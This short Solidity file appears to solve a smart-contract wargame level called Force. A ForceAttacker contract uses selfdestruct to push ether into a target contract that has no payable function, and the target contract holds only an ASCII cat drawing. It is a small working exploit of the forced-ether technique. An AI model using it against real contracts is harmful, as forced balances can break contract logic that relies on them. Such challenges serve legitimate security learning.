// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {

  function attack(address _forceContract) public payable {
    selfdestruct(payable(_forceContract));

  }
}

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}